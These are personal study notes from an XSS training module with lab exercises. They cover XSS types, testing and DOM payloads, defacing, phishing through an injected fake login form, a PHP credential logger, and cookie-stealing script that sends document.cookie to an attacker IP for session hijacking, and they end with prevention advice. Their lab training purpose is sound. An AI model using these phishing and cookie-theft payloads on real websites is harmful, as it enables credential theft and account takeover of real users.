#cybersecurity #CWES #XSS #hacking #HTB #web 
- [[Cross-Site Scripting (XSS)#XSS Testing Payloads]]
- [[Cross-Site Scripting (XSS)#Login Form Injection]]

---
XSS vulnerabilities take advantage of a flaw in user input sanitization to "write" JavaScript code to the page and execute it on the client side, leading to several types of attacks.

XSS vulnerabilities are solely executed on the client-side and hence do not directly affect the back-end server. They can only affect the user executing the vulnerability. The direct impact of XSS vulnerabilities on the back-end server may be relatively low, but they are very commonly found in web applications, so this equates to a medium risk (`low impact + high probability = medium risk`), which we should always attempt to `reduce` risk by detecting, remediating, and proactively preventing these types of vulnerabilities.
## Types of XSS

There are three main types of XSS vulnerabilities:

|Type|Description|
|---|---|
|`Stored (Persistent) XSS`|The most critical type of XSS, which occurs when user input is stored on the back-end database and then displayed upon retrieval (e.g., posts or comments)|
|`Reflected (Non-Persistent) XSS`|Occurs when user input is displayed on the page after being processed by the backend server, but without being stored (e.g., search result or error message)|
|`DOM-based XSS`|Another Non-Persistent XSS type that occurs when user input is directly shown in the browser and is completely processed on the client-side, without reaching the back-end server (e.g., through client-side HTTP parameters or anchor tags)|
## XSS Testing Payloads

```js
<script>alert(window.origin)</script>
```

As we can see, we did indeed get the alert, which means that the page is vulnerable to XSS, since our payload executed successfully. We can confirm this further by looking at the page source by clicking `CTRL+U` or right-clicking and selecting `View Page Source`, and we should see our payload in the page source.

>[!Tip] 
Many modern web applications utilize cross-domain IFrames to handle user input, so that even if the web form is vulnerable to XSS, it would not be a vulnerability on the main web application. This is why we are showing the value of `window.origin` in the alert box, instead of a static value like `1`. In this case, the alert box would reveal the URL it is being executed on, and will confirm which form is the vulnerable one, in case an IFrame was being used.
## Exercise
### To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

```js
<script>alert(document.cookie)</script>
```
# Reflected XSS

```html
http://154.57.164.74:31484/index.php?task=%3Cscript%3Ealert(document.cookie)%3C/script%3E
```
## Source & Sink

To further understand the nature of the DOM-based XSS vulnerability, we must understand the concept of the `Source` and `Sink` of the object displayed on the page. The `Source` is the JavaScript object that takes the user input, and it can be any input parameter like a URL parameter or an input field, as we saw above.

On the other hand, the `Sink` is the function that writes the user input to a DOM Object on the page. If the `Sink` function does not properly sanitize the user input, it would be vulnerable to an XSS attack. Some of the commonly used JavaScript functions to write to DOM objects are:

- `document.write()`
- `DOM.innerHTML`
- `DOM.outerHTML`

Furthermore, some of the `jQuery` library functions that write to DOM objects are:

- `add()`
- `after()`
- `append()`
## DOM Attacks

If we try the XSS payload we have been using previously, we will see that it will not execute. This is because the `innerHTML` function does not allow the use of the `<script>` tags within it as a security feature. Still, there are many other XSS payloads we use that do not contain `<script>` tags, like the following XSS payload:

```html
<img src="" onerror=alert(window.origin)>
```

The above line creates a new HTML image object, which has a `onerror` attribute that can execute JavaScript code when the image is not found. So, as we provided an empty image link (`""`), our code should always get executed without having to use `<script>` tags:
## Exercise
### To get the flag, use the same payload we used above, but change its JavaScript code to show the cookie instead of showing the url.

```js
http://154.57.164.83:32603/?task=%3Cimg%20src=%22%22%20onerror=alert(document.cookie)%3E
```
# XSS Discovery

Some of the common open-source tools that can assist us in XSS discovery are [XSS Strike](https://github.com/s0md3v/XSStrike), [Brute XSS](https://github.com/rajeshmajumdar/BruteXSS), and [XSSer](https://github.com/epsylon/xsser). We can try `XSS Strike` by cloning it to our VM with `git clone`:
```shell
git clone https://github.com/s0md3v/XSStrike.git
cd XSStrike
pip install -r requirements.txt
python xsstrike.py
```
## Exercise

```python
python xsstrike.py -u http://154.57.164.64:31173/\?fullname\=prueba\&username\=olis\&password\=prueba\&email\=ola%40gmail.com
```
# Defacing

One of the most common attacks usually used with stored XSS vulnerabilities is website defacing attacks. `Defacing` a website means changing its look for anyone who visits the website. It is very common for hacker groups to deface a website to claim that they had successfully hacked it.
## Changing Background

Let's go back to our `Stored XSS` exercise and use it as a basis for our attack. You can go back to the `Stored XSS` section to spawn the server and follow the next steps.

To change a web page's background, we can choose a certain color or use an image. We will use a color as our background since most defacing attacks use a dark color for the background. To do so, we can use the following payload:

```html
<script>document.body.style.background = "#141d2b"</script>
# Example
http://154.57.164.64:31173/?fullname=prueba&username=olis&password=prueba&email=%3Cscript%3Edocument.body.style.background=%22green%22%3C/script%3E
```

## Changing Page Title

We can change the page title from `2Do` to any title of our choosing, using the `document.title` JavaScript property:

```html
<script>document.title = 'HackTheBox Academy'</script>
# Example
http://154.57.164.64:31173/?fullname=prueba&username=olis&password=prueba&email=%3Cscript%3Edocument.title=%22ayelaldo%20has%20pwned%20you%22%3C/script%3E
```
## Changing Page Text

When we want to change the text displayed on the web page, we can utilize various JavaScript functions for doing so. For example, we can change the text of a specific HTML element/DOM using the `innerHTML` property:

```js
document.getElementById("todo").innerHTML = "New Text"
```

We can also utilize jQuery functions for more efficiently achieving the same thing or for changing the text of multiple elements in one line (to do so, the `jQuery` library must have been imported within the page source):

```javascript
$("#todo").html('New Text');
```
# Phishing

Another very common type of XSS attack is a phishing attack. Phishing attacks usually utilize legitimate-looking information to trick the victims into sending their sensitive information to the attacker. A common form of XSS phishing attacks is through injecting fake login forms that send the login details to the attacker's server, which may then be used to log in on behalf of the victim and gain control over their account and sensitive information.
## Looking for the type of XSS vuln
```js
// url
http://10.129.59.20/phishing/index.php?url=url%27%20onerror=alert(%22hola%22)%3E%3Ch1%3E%27XSS%3C/h1%3E
// Source code
<div class="form-group">
            <form role="form" action="index.php" method="GET" id='urlform'>
                <input type="text" placeholder="Image URL" name="url">
            </form>
            <br>
            <img src='url' onerror=alert("hola")><h1>'XSS</h1>'>        
</div>
```

## Login Form Injection
Once we identify a working XSS payload, we can proceed to the phishing attack. To perform an XSS phishing attack, we must inject HTML code that displays a login form on the targeted page. This form should send the login information to a server we are listening on, such that once a user attempts to log in, we'd get their credentials.

We can easily find HTML code for a basic login form, or we can write our own login form. The following example should present a login form:

```html
<h3>Please login to continue</h3>
<form action=http://OUR_IP>
    <input type="username" name="username" placeholder="Username">
    <input type="password" name="password" placeholder="Password">
    <input type="submit" name="submit" value="Login">
</form>
```

```js
// Minified JS
document.write('<h3>Please login to continue</h3><form action=http://10.10.14.133:777><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password">     <input type="submit" name="submit" value="Login"></form>');
```
### Final URL

```js
	http://10.129.59.20/phishing/index.php?url=url%27document.write(%27%3Ch3%3EPlease%20login%20to%20continue%3C/h3%3E%3Cform%20action=http://10.10.14.133:7777%3E%3Cinput%20type=%22username%22%20name=%22username%22%20placeholder=%22Username%22%3E%3Cinput%20type=%22password%22%20name=%22password%22%20placeholder=%22Password%22%3E%20%20%20%20%20%3Cinput%20type=%22submit%22%20name=%22submit%22%20value=%22Login%22%3E%3C/form%3E
```
### Result in attacker

```shell
nc -lvnp 7777    

Listening on 0.0.0.0 7777
Connection received on 10.10.14.133 42214
GET /?username=aldo&password=password123&submit=Login HTTP/1.1
Host: 10.10.14.133:7777
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.129.59.20/
DNT: 1
Connection: keep-alive
Upgrade-Insecure-Requests: 1
Priority: u=0, i
```

## Cleaning Up

We can see that the URL field is still displayed, which defeats our line of "`Please login to continue`". So, to encourage the victim to use the login form, we should remove the URL field, such that they may think that they have to log in to be able to use the page. To do so, we can use the JavaScript function `document.getElementById().remove()` function.
### Tunned payload (it doesn't work)
```js
// Minified JS
document.write('<h3>Please login to continue</h3><form action=http://10.10.14.133:777><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password">     <input type="submit" name="submit" value="Login"></form>');document.getElementbyID("urlform").remove()
```

However, as we are only listening with a `netcat` listener, it will not handle the HTTP request correctly, and the victim would get an `Unable to connect` error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections.

## Credential Stealing

Finally, we come to the part where we steal the login credentials when the victim attempts to log in on our injected login form. If you tried to log into the injected login form, you would probably get the error `This site can’t be reached`. This is because, as mentioned earlier, our HTML form is designed to send the login request to our IP, which should be listening for a connection. If we are not listening for a connection, we will get a `site can’t be reached` error.

However, as we are only listening with a `netcat` listener, it will not handle the HTTP request correctly, and the victim would get an `Unable to connect` error, which may raise some suspicions. So, we can use a basic PHP script that logs the credentials from the HTTP request and then returns the victim to the original page without any injections. In this case, the victim may think that they successfully logged in and will use the Image Viewer as intended.

```php
<?php if (isset($_GET['username']) && isset($_GET['password'])) { $file = fopen("creds.txt", "a+"); fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n"); header("Location: http://SERVER_IP/phishing/index.php"); fclose($file); exit(); } ?>
```

```shell
mkdir /tmp/tmpserver 
cd /tmp/tmpserver
vi index.php #at this step we wrote our index.php file 
sudo php -S 0.0.0.0:<port>
# ----
 PHP 7.4.15 Development Server (http://0.0.0.0:80) started
[Sun Jul 12 17:38:26 2026] 10.10.14.133:36790 Accepted
[Sun Jul 12 17:38:26 2026] 10.10.14.133:36790 [302]: GET /?username=ayelaldo&password=Shira2020&submit=Login
[Sun Jul 12 17:38:26 2026] 10.10.14.133:36790 Closing
```
# Session Hijacking

Modern web applications utilize cookies to maintain a user's session throughout different browsing sessions. This enables the user to only log in once and keep their logged-in session alive even if they visit the same website at another time or date. However, if a malicious user obtains the cookie data from the victim's browser, they may be able to gain logged-in access with the victim's user without knowing their credentials.

With the ability to execute JavaScript code on the victim's browser, we may be able to collect their cookies and send them to our server to hijack their logged-in session by performing a `Session Hijacking` (aka `Cookie Stealing`) attack.
### Exercise

To find the type of XSS, we need to try with all the fields. We tried with many payloads but we get it with this one:

```js
"><script src=http://OUR_IP></script>
```

```js
// URL text field
"><script>new Image().src='http://10.10.15.77/index.php?c='+document.cookie;</script>
```

It sends the cookie`c00k1355h0u1d8353cu23d`
### Separate cookies script

We can save the following PHP script as `index.php`, and re-run the PHP server again:
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['10.129.96.253']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

We can go to the Inspect area to insert the cookie we stole.

Finally, we can use this cookie on the `login.php` page to access the victim's account. To do so, once we navigate to `/hijacking/login.php`, we can click `Shift+F9` in Firefox to reveal the `Storage` bar in the Developer Tools. Then, we can click on the `+` button on the top right corner and add our cookie, where the `Name` is the part before `=` and the `Value` is the part after `=` from our stolen cookie:
`HTB{4lw4y5_53cur3_y0ur_c00k135}`
# XSS Prevention

By now, we should have a good understanding of what an XSS vulnerability is and its different types, how to detect an XSS vulnerability, and how to exploit XSS vulnerabilities. We will conclude the module by learning how to defend against XSS vulnerabilities.
The most important aspect of preventing XSS vulnerabilities is proper input sanitization and validation on both the front and back end. In addition to that, other security measures can be taken to help prevent XSS attacks.

## Front-End
#### Direct Input

Finally, we should always ensure that we never use user input directly within certain HTML tags, like:

1. JavaScript code `<script></script>`
2. CSS Style Code `<style></style>`
3. Tag/Attribute Fields `<div name='INPUT'></div>`
4. HTML Comments `<!-- -->`

If user input goes into any of the above examples, it can inject malicious JavaScript code, which may lead to an XSS vulnerability. In addition to this, we should avoid using JavaScript functions that allow changing raw text of HTML fields, like:

- `DOM.innerHTML`
- `DOM.outerHTML`
- `document.write()`
- `document.writeln()`
- `document.domain`

And the following jQuery functions:

- `html()`
- `parseHTML()`
- `add()`
- `append()`
- `prepend()`
- `after()`
- `insertAfter()`
- `before()`
- `insertBefore()`
- `replaceAll()`
- `replaceWith()`

As these functions write raw text to the HTML code, if any user input goes into them, it may include malicious JavaScript code, which leads to an XSS vulnerability.
## Back end
#### Input Sanitization

When it comes to input sanitization, then the back-end plays a vital role, as front-end input sanitization can be easily bypassed by sending custom `GET` or `POST` requests. Luckily, there are very strong libraries for various back-end languages that can properly sanitize any user input, such that we ensure that no injection can occur.

For example, for a PHP back-end, we can use the `addslashes` function to sanitize user input by escaping special characters with a backslash:
```php
addslashes($_GET['email'])
```

In any case, direct user input (e.g. `$_GET['email']`) should never be directly displayed on the page, as this can lead to XSS vulnerabilities.

For a NodeJS back-end, we can also use the [DOMPurify](https://github.com/cure53/DOMPurify) library as we did with the front-end, as follows:

```php
import DOMPurify from 'dompurify'; var clean = DOMPurify.sanitize(dirty);
```

#### Output HTML Encoding

Another important aspect to pay attention to in the back-end is `Output Encoding`. This means that we have to encode any special characters into their HTML codes, which is helpful if we need to display the entire user input without introducing an XSS vulnerability. For a PHP back-end, we can use the `htmlspecialchars` or the `htmlentities` functions, which would encode certain special characters into their HTML codes (e.g. `<` into `&lt;`), so the browser will display them correctly, but they will not cause any injection of any sort:

```php
htmlentities($_GET['email']);
```

For a NodeJS back-end, we can use any library that does HTML encoding, like `html-entities`, as follows:

```php
import encode from 'html-entities'; encode('<'); // -> '&lt;'
```

Once we ensure that all user input is validated, sanitized, and encoded on output, we should significantly reduce the risk of having XSS vulnerabilities.

#### Server Configuration

In addition to the above, there are certain back-end web server configurations that may help in preventing XSS attacks, such as:

- Using HTTPS across the entire domain.
- Using XSS prevention headers.
- Using the appropriate Content-Type for the page, like `X-Content-Type-Options=nosniff`.
- Using `Content-Security-Policy` options, like `script-src 'self'`, which only allows locally hosted scripts.
- Using the `HttpOnly` and `Secure` cookie flags to prevent JavaScript from reading cookies and only transport them over HTTPS.

In addition to the above, having a good `Web Application Firewall (WAF)` can significantly reduce the chances of XSS exploitation, as it will automatically detect any type of injection going through HTTP requests and will automatically reject such requests. Furthermore, some frameworks provide built-in XSS protection, like [ASP.NET](https://learn.microsoft.com/en-us/aspnet/core/security/cross-site-scripting?view=aspnetcore-7.0).

> [!info] LAB
> ![[XSS Vulnerabilities]]

